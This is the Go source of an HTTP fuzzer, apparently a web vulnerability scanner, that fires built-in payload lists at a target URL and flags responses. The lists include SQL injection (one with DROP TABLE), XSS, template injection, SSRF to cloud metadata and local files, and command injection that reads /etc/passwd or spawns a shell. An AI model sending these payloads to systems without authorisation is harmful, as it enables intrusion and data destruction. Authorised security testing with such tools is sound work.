// glitchfuzz3/main.go
// GLITCHICONS — Coverage-Guided HTTP Fuzzer v3
//
// Major upgrade over glitchfuzz2:
//   - Corpus management: save interesting inputs across runs
//   - Grammar-based mutation: YAML/JSON grammar file
//   - OpenAPI/Swagger seed extraction
//   - Response clustering (group similar responses)
//   - Smart deduplication (avoid retesting same clusters)
//   - Multi-strategy mutation engine
//
// Mutation Strategies:
//   inject    — Security injection payloads (SQLi/XSS/SSTI/SSRF/cmdi)
//   boundary  — Integer/string boundary values
//   typefuzz  — Type confusion (string→int, null, bool, array)
//   bitflip   — Bit flip + random byte substitution
//   corpus    — Mutate from saved corpus entries
//   all       — Apply all strategies round-robin
//
// Usage:
//   glitchfuzz3 http --url https://api.corp.com/search?q=FUZZ
//   glitchfuzz3 grammar --url https://api.corp.com/search --grammar api.json
//   glitchfuzz3 openapi --url https://api.corp.com --spec openapi.json
//   glitchfuzz3 --version

package main

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const Version = "4.8.0"

// ── Payload libraries ─────────────────────────────────────

var sqliPayloads = []string{
	"'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
	"' OR 1=1#", "admin'--", "' UNION SELECT NULL--",
	"1; DROP TABLE users--", "' AND SLEEP(5)--",
	"1' ORDER BY 1--", "' AND 1=2 UNION SELECT 1,2,3--",
	"'; WAITFOR DELAY '0:0:5'--", "1 OR 1=1",
}

var xssPayloads = []string{
	"<script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"javascript:alert(1)",
	"<svg onload=alert(1)>",
	"\" onmouseover=alert(1) x=\"",
	"';alert(1)//",
	"<iframe src=javascript:alert(1)>",
	"${alert(1)}",
	"{{7*7}}",
	"<%=7*7%>",
}

var sstiPayloads = []string{
	"{{7*7}}", "${7*7}", "<%= 7*7 %>",
	"{{config}}", "{{self}}", "${T(java.lang.Runtime)}",
	"#{7*7}", "*{7*7}", "@{7*7}",
	"{{''.__class__.__mro__[2].__subclasses__()}}",
}

var ssrfPayloads = []string{
	"http://localhost/", "http://127.0.0.1/",
	"http://169.254.169.254/latest/meta-data/",
	"http://[::1]/", "http://0.0.0.0/",
	"http://internal.corp.local/",
	"file:///etc/passwd",
	"dict://localhost:6379/",
	"gopher://localhost:6379/_PING",
}

var cmdiPayloads = []string{
	"; id", "| id", "& id", "`id`", "$(id)",
	"; cat /etc/passwd", "| whoami", "; sleep 5",
	"\n/bin/sh -i", "|| ping -c 3 127.0.0.1",
}

var boundaryValues = []string{
	"0", "-1", "1", "2147483647", "2147483648", "-2147483648",
	"9999999999", "0.0", "-0.1", "null", "undefined",
	"true", "false", "[]", "{}", "",
	strings.Repeat("A", 1000), strings.Repeat("A", 8192),
	"../../../etc/passwd", "%00", "\x00", "\n",
}

var typeConfusion = []string{
	"null", "true", "false", "[]", "{}",
	"[1,2,3]", `{"key":"value"}`,
	"0", "-1", "1.5", "NaN", "Infinity",
	"undefined", `"string"`,
}

// ── Grammar types ─────────────────────────────────────────

type Grammar struct {
	Rules map[string][]string `json:"rules"`
}

// ── OpenAPI types ─────────────────────────────────────────

type OpenAPISpec struct {
	Paths map[string]map[string]struct {
		Parameters []struct {
			Name     string `json:"name"`
			In       string `json:"in"` // query/body/path/header
			Required bool   `json:"required"`
			Schema   struct {
				Type string `json:"type"`
			} `json:"schema"`
		} `json:"parameters"`
	} `json:"paths"`
}

// ── Corpus management ─────────────────────────────────────

type CorpusEntry struct {
	Input      string `json:"input"`
	StatusCode int    `json:"status_code"`
	BodyHash   string `json:"body_hash"`
	BodySize   int    `json:"body_size"`
	ClusterID  string `json:"cluster_id"`
	Strategy   string `json:"strategy"`
	Timestamp  string `json:"timestamp"`
}

type Corpus struct {
	mu      sync.Mutex
	entries []CorpusEntry
	path    string
	clusters map[string]bool // cluster_id → seen
}

func newCorpus(path string) *Corpus {
	c := &Corpus{
		path:     path,
		clusters: make(map[string]bool),
	}
	c.load()
	return c
}

func (c *Corpus) clusterID(statusCode, bodySize int, bodyHash string) string {
	bucket := bodySize / 200 // Group by ~200 byte buckets
	raw    := fmt.Sprintf("%d:%d:%s", statusCode, bucket, bodyHash[:8])
	h      := md5.Sum([]byte(raw))
	return hex.EncodeToString(h[:])[:12]
}

func (c *Corpus) isNew(clusterID string) bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.clusters[clusterID] {
		return false
	}
	c.clusters[clusterID] = true
	return true
}

func (c *Corpus) add(entry CorpusEntry) {
	c.mu.Lock()
	c.entries = append(c.entries, entry)
	c.mu.Unlock()
	c.save()
}

func (c *Corpus) mutate() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	if len(c.entries) == 0 {
		return ""
	}
	e := c.entries[rand.Intn(len(c.entries))]
	// Mutate the saved input
	input := e.Input
	if len(input) == 0 {
		return ""
	}
	// Random byte flip
	b   := []byte(input)
	idx := rand.Intn(len(b))
	b[idx] = byte(rand.Intn(256))
	return string(b)
}

func (c *Corpus) load() {
	if c.path == "" {
		return
	}
	data, err := os.ReadFile(c.path)
	if err != nil {
		return
	}
	var entries []CorpusEntry
	if err := json.Unmarshal(data, &entries); err != nil {
		return
	}
	c.entries = entries
	for _, e := range entries {
		c.clusters[e.ClusterID] = true
	}
	fmt.Printf("[*] Corpus: loaded %d entries (%d clusters)\n",
		len(entries), len(c.clusters))
}

func (c *Corpus) save() {
	if c.path == "" {
		return
	}
	c.mu.Lock()
	data, _ := json.MarshalIndent(c.entries, "", "  ")
	c.mu.Unlock()
	os.WriteFile(c.path, data, 0644)
}

// ── Response clustering ───────────────────────────────────

type Response struct {
	StatusCode int
	Body       []byte
	BodyHash   string
	BodySize   int
	Headers    http.Header
	DurationMS int64
}

func (r *Response) hash() string {
	h := md5.Sum(r.Body)
	return hex.EncodeToString(h[:])
}

// ── Finding ───────────────────────────────────────────────

type Finding struct {
	Title       string  `json:"title"`
	Severity    string  `json:"severity"`
	CVSS        float64 `json:"cvss"`
	CWE         string  `json:"cwe"`
	Target      string  `json:"target"`
	Description string  `json:"description"`
	Evidence    string  `json:"evidence"`
	Remediation string  `json:"remediation"`
	Source      string  `json:"source"`
	Payload     string  `json:"payload"`
	StatusCode  int     `json:"status_code"`
	DurationMS  int64   `json:"duration_ms"`
}

// ── HTTP Client ───────────────────────────────────────────

func newClient(timeout time.Duration) *http.Client {
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives: true,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func sendRequest(client *http.Client, method, url, payload string, headers map[string]string) (*Response, error) {
	var body io.Reader
	if method != "GET" && payload != "" {
		body = strings.NewReader(payload)
	}

	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "glitchfuzz3/"+Version)
	if method != "GET" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	start := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	elapsed := time.Since(start).Milliseconds()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
	h := md5.Sum(respBody)

	return &Response{
		StatusCode: resp.StatusCode,
		Body:       respBody,
		BodyHash:   hex.EncodeToString(h[:]),
		BodySize:   len(respBody),
		Headers:    resp.Header,
		DurationMS: elapsed,
	}, nil
}

// ── Payload generators ────────────────────────────────────

func getPayloads(strategy string) []string {
	switch strategy {
	case "inject":
		var all []string
		all = append(all, sqliPayloads...)
		all = append(all, xssPayloads...)
		all = append(all, sstiPayloads...)
		all = append(all, ssrfPayloads...)
		all = append(all, cmdiPayloads...)
		return all
	case "boundary":
		return boundaryValues
	case "typefuzz":
		return typeConfusion
	case "bitflip":
		// Generate random bitflip variants of base strings
		var payloads []string
		bases := []string{"admin", "1", "test", "null", "true"}
		for _, b := range bases {
			for i := 0; i < 5; i++ {
				buf := []byte(b)
				if len(buf) > 0 {
					buf[rand.Intn(len(buf))] ^= byte(rand.Intn(256))
				}
				payloads = append(payloads, string(buf))
			}
		}
		return payloads
	default: // "all"
		var all []string
		all = append(all, sqliPayloads...)
		all = append(all, xssPayloads...)
		all = append(all, sstiPayloads...)
		all = append(all, boundaryValues...)
		all = append(all, typeConfusion...)
		return all
	}
}

func generateFromGrammar(grammar *Grammar, rule string, depth int) string {
	if depth > 5 {
		return rule
	}
	options, ok := grammar.Rules[rule]
	if !ok || len(options) == 0 {
		return rule
	}
	choice := options[rand.Intn(len(options))]
	// Recursively expand if choice is a rule reference
	if opts, isRule := grammar.Rules[choice]; isRule && len(opts) > 0 {
		return generateFromGrammar(grammar, choice, depth+1)
	}
	return choice
}

// ── Finding detection ─────────────────────────────────────

func analyzeResponse(url, payload, strategy string, resp *Response, baseline *Response) *Finding {
	bodyStr := strings.ToLower(string(resp.Body))

	// Error-based detection
	errorIndicators := map[string]struct{ title, cwe string }{
		"sql syntax":            {"SQL Injection (Error-Based)", "CWE-89"},
		"mysql_fetch_array":     {"SQL Injection (MySQL Error)", "CWE-89"},
		"ora-01756":             {"SQL Injection (Oracle Error)", "CWE-89"},
		"microsoft ole db":      {"SQL Injection (MSSQL Error)", "CWE-89"},
		"pg::syntaxerror":       {"SQL Injection (PostgreSQL Error)", "CWE-89"},
		"<script>alert":        {"Reflected XSS", "CWE-79"},
		"traceback (most recent": {"Python Stack Trace Disclosure", "CWE-209"},
		"system.exception":      {".NET Exception Disclosure", "CWE-209"},
		"java.lang.exception":   {"Java Exception Disclosure", "CWE-209"},
		"49":                    {"SSTI (7*7=49 confirmed)", "CWE-94"},
	}

	for indicator, finding := range errorIndicators {
		if strings.Contains(bodyStr, indicator) {
			sev, cvss := "HIGH", 7.5
			if strings.Contains(finding.title, "SQL Injection") {
				sev, cvss = "CRITICAL", 9.8
			}
			if strings.Contains(finding.title, "SSTI") {
				sev, cvss = "CRITICAL", 9.8
			}
			return &Finding{
				Title:       finding.title + " Detected",
				Severity:    sev,
				CVSS:        cvss,
				CWE:         finding.cwe,
				Target:      url,
				Description: fmt.Sprintf("Fuzzing detected %s via payload injection.", finding.title),
				Evidence:    fmt.Sprintf("Payload: %s\nStatus: %d | Size: %d\nIndicator: '%s'", payload, resp.StatusCode, resp.BodySize, indicator),
				Remediation: "Sanitize and validate all user inputs. Use parameterized queries. Implement proper error handling.",
				Source:      "module:glitchfuzz3",
				Payload:     payload,
				StatusCode:  resp.StatusCode,
				DurationMS:  resp.DurationMS,
			}
		}
	}

	// 5xx server error
	if resp.StatusCode >= 500 {
		return &Finding{
			Title:      "Server Error on Fuzz Input (500)",
			Severity:   "HIGH",
			CVSS:       7.5,
			CWE:        "CWE-755",
			Target:     url,
			Description: "Application returned 5xx error on fuzz input — may indicate crash, unhandled exception, or injection.",
			Evidence:   fmt.Sprintf("Payload: %s\nStatus: %d | Size: %d", payload, resp.StatusCode, resp.BodySize),
			Remediation: "Implement proper error handling. Never return stack traces. Validate inputs before processing.",
			Source:     "module:glitchfuzz3",
			Payload:    payload,
			StatusCode: resp.StatusCode,
			DurationMS: resp.DurationMS,
		}
	}

	// Time-based detection (5+ seconds)
	if resp.DurationMS >= 5000 {
		return &Finding{
			Title:      "Time-Based Blind Injection Detected",
			Severity:   "HIGH",
			CVSS:       8.1,
			CWE:        "CWE-89",
			Target:     url,
			Description: fmt.Sprintf("Response took %dms with fuzz payload — indicates time-based blind injection (SQLi/CMDi/SSTI).", resp.DurationMS),
			Evidence:   fmt.Sprintf("Payload: %s\nDuration: %dms (baseline: %dms)", payload, resp.DurationMS, func() int64 { if baseline != nil { return baseline.DurationMS }; return 0 }()),
			Remediation: "Investigate input handling. Time-based injection suggests SQL SLEEP/WAITFOR or command injection.",
			Source:     "module:glitchfuzz3",
			Payload:    payload,
			StatusCode: resp.StatusCode,
			DurationMS: resp.DurationMS,
		}
	}

	return nil
}

// ── Fuzz runner ───────────────────────────────────────────

type FuzzConfig struct {
	URL        string
	Method     string
	Strategy   string
	Threads    int
	RatePerSec int
	Timeout    int
	CorpusPath string
	OutputPath string
	Verbose    bool
	Grammar    *Grammar
	OpenAPI    *OpenAPISpec
}

type FuzzResult struct {
	URL          string    `json:"url"`
	Strategy     string    `json:"strategy"`
	Timestamp    string    `json:"timestamp"`
	TotalRequests int64    `json:"total_requests"`
	UniqueCluster int      `json:"unique_clusters"`
	Findings     []Finding `json:"findings"`
	CorpusSize   int       `json:"corpus_size"`
	DurationS    float64   `json:"duration_s"`
	Version      string    `json:"scanner_version"`
}

func runFuzz(cfg *FuzzConfig) FuzzResult {
	start   := time.Now()
	result  := FuzzResult{
		URL:       cfg.URL,
		Strategy:  cfg.Strategy,
		Timestamp: start.UTC().Format(time.RFC3339),
		Version:   Version,
	}

	corpus  := newCorpus(cfg.CorpusPath)
	client  := newClient(time.Duration(cfg.Timeout) * time.Second)

	var (
		totalReqs   int64
		mu          sync.Mutex
		findings    []Finding
		uniqueClusters int
	)

	// Get baseline
	fmt.Println("[*] Getting baseline response...")
	baseURL := strings.Replace(cfg.URL, "FUZZ", "baseline_test_value", 1)
	baseline, _ := sendRequest(client, cfg.Method, baseURL, "", nil)
	if baseline != nil {
		fmt.Printf("[*] Baseline: HTTP %d | Size: %d | Time: %dms\n",
			baseline.StatusCode, baseline.BodySize, baseline.DurationMS)
	}

	// Get payloads
	var payloads []string
	switch {
	case cfg.Grammar != nil:
		// Grammar-based: generate N payloads from grammar rules
		for i := 0; i < 200; i++ {
			for rule := range cfg.Grammar.Rules {
				payloads = append(payloads, generateFromGrammar(cfg.Grammar, rule, 0))
			}
		}
	case cfg.OpenAPI != nil:
		// OpenAPI: extract parameters and generate payloads
		for _, methods := range cfg.OpenAPI.Paths {
			for _, op := range methods {
				for _, param := range op.Parameters {
					_ = param.Name
					payloads = append(payloads, getPayloads("inject")...)
				}
			}
		}
		if len(payloads) == 0 {
			payloads = getPayloads("all")
		}
	case cfg.CorpusPath != "" && len(corpus.entries) > 0:
		// Corpus mutation
		for i := 0; i < 100; i++ {
			if m := corpus.mutate(); m != "" {
				payloads = append(payloads, m)
			}
		}
		payloads = append(payloads, getPayloads(cfg.Strategy)...)
	default:
		payloads = getPayloads(cfg.Strategy)
	}

	fmt.Printf("[*] glitchfuzz3 v%s | %s | strategy=%s | payloads=%d | threads=%d\n",
		Version, cfg.URL, cfg.Strategy, len(payloads), cfg.Threads)

	// Rate limiter
	rate    := time.Second / time.Duration(cfg.RatePerSec)
	limiter := time.NewTicker(rate)
	defer limiter.Stop()

	// Semaphore
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for _, payload := range payloads {
		<-limiter.C
		wg.Add(1)
		sem <- struct{}{}
		p := payload

		go func() {
			defer wg.Done()
			defer func() { <-sem }()

			// Substitute FUZZ marker
			url := strings.Replace(cfg.URL, "FUZZ", p, -1)
			atomic.AddInt64(&totalReqs, 1)

			resp, err := sendRequest(client, cfg.Method, url, p, nil)
			if err != nil {
				return
			}

			// Cluster check
			cid  := corpus.clusterID(resp.StatusCode, resp.BodySize, resp.BodyHash)
			isNew := corpus.isNew(cid)

			if isNew {
				mu.Lock()
				uniqueClusters++
				mu.Unlock()

				// Save to corpus
				entry := CorpusEntry{
					Input:      p,
					StatusCode: resp.StatusCode,
					BodyHash:   resp.BodyHash,
					BodySize:   resp.BodySize,
					ClusterID:  cid,
					Strategy:   cfg.Strategy,
					Timestamp:  time.Now().UTC().Format(time.RFC3339),
				}
				corpus.add(entry)
			}

			// Analyze for findings
			finding := analyzeResponse(cfg.URL, p, cfg.Strategy, resp, baseline)
			if finding != nil {
				mu.Lock()
				findings = append(findings, *finding)
				mu.Unlock()
				fmt.Printf("[!] FINDING: %s | %s\n", finding.Title, finding.Payload[:minStr(len(finding.Payload), 40)])
			} else if cfg.Verbose && isNew {
				fmt.Printf("[+] New cluster: %s | HTTP %d | %d bytes | payload: %s\n",
					cid, resp.StatusCode, resp.BodySize, p[:minStr(len(p), 30)])
			}
		}()
	}

	wg.Wait()
	duration := time.Since(start).Seconds()

	result.TotalRequests  = totalReqs
	result.UniqueCluster  = uniqueClusters
	result.Findings       = findings
	result.CorpusSize     = len(corpus.entries)
	result.DurationS      = duration

	fmt.Printf("\n[*] Done: %d requests | %d unique clusters | %d findings | %.1fs | %.0f req/s\n",
		totalReqs, uniqueClusters, len(findings), duration, float64(totalReqs)/duration)

	return result
}

func minStr(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ── Main ──────────────────────────────────────────────────

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}
	if os.Args[1] == "--version" {
		fmt.Printf("glitchfuzz3 v%s\n", Version)
		os.Exit(0)
	}

	mode := os.Args[1]
	fs   := flag.NewFlagSet(mode, flag.ExitOnError)

	url        := fs.String("url",      "",      "Target URL (use FUZZ marker)")
	method     := fs.String("method",   "GET",   "HTTP method")
	strategy   := fs.String("strategy", "all",   "Mutation strategy: inject|boundary|typefuzz|bitflip|corpus|all")
	threads    := fs.Int("threads",     10,      "Concurrent goroutines")
	rate       := fs.Int("rate",        100,     "Requests per second")
	timeout    := fs.Int("timeout",     10,      "Request timeout seconds")
	corpusPath := fs.String("corpus",   "",      "Corpus file path (.json)")
	grammarF   := fs.String("grammar",  "",      "Grammar file (.json)")
	specF      := fs.String("spec",     "",      "OpenAPI spec file (.json)")
	output     := fs.String("output",   "",      "Output JSON file")
	verbose    := fs.Bool("verbose",    false,   "Verbose output")
	fs.Parse(os.Args[2:])

	if *url == "" {
		fmt.Fprintln(os.Stderr, "[!] --url required")
		os.Exit(1)
	}

	cfg := &FuzzConfig{
		URL:        *url,
		Method:     *method,
		Strategy:   *strategy,
		Threads:    *threads,
		RatePerSec: *rate,
		Timeout:    *timeout,
		CorpusPath: *corpusPath,
		OutputPath: *output,
		Verbose:    *verbose,
	}

	// Load grammar
	if *grammarF != "" {
		data, err := os.ReadFile(*grammarF)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Cannot read grammar: %v\n", err)
			os.Exit(1)
		}
		var grammar Grammar
		if err := json.Unmarshal(data, &grammar); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Invalid grammar JSON: %v\n", err)
			os.Exit(1)
		}
		cfg.Grammar = &grammar
		cfg.Strategy = "grammar"
	}

	// Load OpenAPI spec
	if *specF != "" {
		data, err := os.ReadFile(*specF)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Cannot read spec: %v\n", err)
			os.Exit(1)
		}
		var spec OpenAPISpec
		if err := json.Unmarshal(data, &spec); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Invalid OpenAPI JSON: %v\n", err)
			os.Exit(1)
		}
		cfg.OpenAPI = &spec
		cfg.Strategy = "openapi"
	}

	result := runFuzz(cfg)

	data, _ := json.MarshalIndent(result, "", "  ")
	if *output != "" {
		// Ensure output directory exists
		os.MkdirAll(filepath.Dir(*output), 0755)
		os.WriteFile(*output, data, 0644)
		fmt.Printf("[+] Results saved to %s\n", *output)
	} else {
		fmt.Println(string(data))
	}
}

func printUsage() {
	fmt.Printf(`glitchfuzz3 v%s — Coverage-Guided HTTP Fuzzer

Usage:
  glitchfuzz3 <mode> --url URL [flags]

Modes:
  http     Standard HTTP fuzzing (use FUZZ in URL/body)
  grammar  Grammar-based fuzzing from JSON grammar file
  openapi  Seed from OpenAPI/Swagger specification

Flags:
  --url       Target URL with FUZZ marker (required)
  --method    HTTP method (default: GET)
  --strategy  inject|boundary|typefuzz|bitflip|corpus|all (default: all)
  --threads   Concurrent goroutines (default: 10)
  --rate      Requests per second (default: 100)
  --timeout   Request timeout seconds (default: 10)
  --corpus    Corpus file for saving/loading interesting inputs
  --grammar   Grammar JSON file for grammar-based fuzzing
  --spec      OpenAPI JSON spec for seeded fuzzing
  --output    Save results to JSON file
  --verbose   Show all new clusters

Examples:
  glitchfuzz3 http    --url "https://api.corp.com/search?q=FUZZ" --strategy inject
  glitchfuzz3 http    --url "https://api.corp.com/search?q=FUZZ" --corpus corp.json
  glitchfuzz3 grammar --url "https://api.corp.com/search?q=FUZZ" --grammar api_grammar.json
  glitchfuzz3 openapi --url "https://api.corp.com" --spec openapi.json

Grammar file format (api_grammar.json):
  {
    "rules": {
      "search_query": ["normal search", "sql_injection", "xss", "FUZZ"],
      "limit": ["10", "-1", "9999", "0"],
      "format": ["json", "xml", "../../etc/passwd"]
    }
  }
`, Version)
}

var _ = bufio.NewReader
var _ = bytes.Contains
